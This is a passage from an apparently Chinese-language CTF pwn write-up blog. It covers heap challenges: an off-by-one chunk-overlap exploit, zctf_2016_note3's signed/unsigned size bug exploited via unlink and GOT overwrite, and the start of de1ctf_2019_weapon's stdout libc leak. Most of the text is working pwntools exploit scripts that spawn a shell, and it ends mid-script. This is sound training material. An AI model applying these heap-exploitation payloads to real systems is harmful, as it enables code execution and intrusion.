punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x41</span><span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> free_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这个程序是一种content—–&gt;data的结构，content中存放着data的指针，show和edit操作都是通过content中的指针来操作的。利用思路为:通过off-by-one，我们可以将我们分配的chunk和程序分配的chunk构造出堆块复用，然后将程序分配的0x20大小的chunk中储存我们申请的chunk的地址修改为free@got的值，这样show这个chunk就能show出free的地址，进而求得system的地址，然后edit这个chunk，将free@got修改为system即可</p><h2 id="0xd-zctf-2016-note3"><a href="#0xd-zctf-2016-note3" class="headerlink" title="0xd.zctf_2016_note3"></a>0xd.zctf_2016_note3</h2><p>got表可写，虽然增删查改四个功能都有，但show功能🔨用没有，所以还是需要修改got表来泄露地址，这就得用到unlink。粗略一看并不能发现明显的漏洞，仔细审一审才发现漏洞在edit功能中</p><pre class=" language-c"><code class="language-c">  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">sub_4009B9</span><span class="token punctuation">(</span><span class="token string">"Input the id of the note:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0     <span class="token operator">-</span> <span class="token number">7</span>     <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">signed</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int128<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">5270498306774157605LL</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> __int128<span class="token punctuation">)</span>v0<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span>v0 <span class="token operator">>></span> <span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>=</span> v0 <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v1 <span class="token operator">=</span> ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Input the new content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">sub_4008DD</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">,</span> qword_6020C0<span class="token punctuation">[</span>v3 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      qword_6020C0<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>ptr<span class="token punctuation">[</span>v3<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Edit success"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"please input correct id."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v1<span class="token punctuation">;</span></code></pre><p>其中的<strong>sub_4008DD</strong>函数如下</p><pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_4008DD</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-34h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Fh] [rbp-11h]</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  ssize_t v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>以for循环读入内容，判断条件是<strong>a2 - 1 &gt; i</strong>这里的a2是我们申请chunk时输入的size，而<strong>i</strong>是一个无符号整型数，有符号整型数和无符号整形术作比较会先将有符号数转为无符号数，再做比较。当我们输入的size=0时，假设此时i=0，int(0-1)和unsigned int(0)作比较，我写了一个demo，能更清楚的看到结果</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> b<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token number">-1</span><span class="token operator">></span>b<span class="token punctuation">)</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="/LawlietLW.github.io/2020/05/08/buuctf-shua-ti-ji-lu/31.jpg" alt=""></p><p>所以，只要我们输入的size为0，edit功能就可以无限制输入，剩下的就是unlink了，unlink到0x6020c8-0x18，然后该改啥改啥</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./zctf_2016_note3'</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./zctf_2016_note3'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#io = remote('node3.buuoj.cn', 25470)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'zctf_2016_note3'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"(less than 1024)"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">":"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>ptr <span class="token operator">=</span> <span class="token number">0x6020c8</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x18</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ptr<span class="token number">-0x10</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 0</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 1</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 2</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">'c'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 3</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(io)</span>dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'puts_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> atoi_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"option--->>"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="0xe-de1ctf-2019-weapon"><a href="#0xe-de1ctf-2019-weapon" class="headerlink" title="0xe.de1ctf_2019_weapon"></a>0xe.de1ctf_2019_weapon</h2><p>这题是我接触的第一道通过stdout泄露libc地址的题目，当初拿着大佬的exp一步步调的，做法跟npuctf的badguy差不多的，就不细🔒了，直接上大佬的exp</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">"debug"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >> \n'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size of weapon: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx :'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>'</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'input idx: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'new content:'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># raw_input()</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x31</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'bbbb'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'cccc'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'\x18'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\xdd\x25'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    delete<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'\x30'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'aaaa'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#gdb.attach(t)</span>    create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>    rename<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> cyclic<span class="token punctuation">(</span><span class="token number">51</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token string">'\x08'</span><span class="token punctuation">)</span>    t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span>    addr_libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>t<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">200</span> <span class="token operator">-</span> <span class="token number">0x3c5540</span>    log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'[+] libc_base: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>addr_libc<span class="token punctuation">)</span><span class="token punctuation">)</span>    magic <span class="token operator">=</span> addr_libc <span class="token operator">+</span> <span class="token number">0xf1147</span>    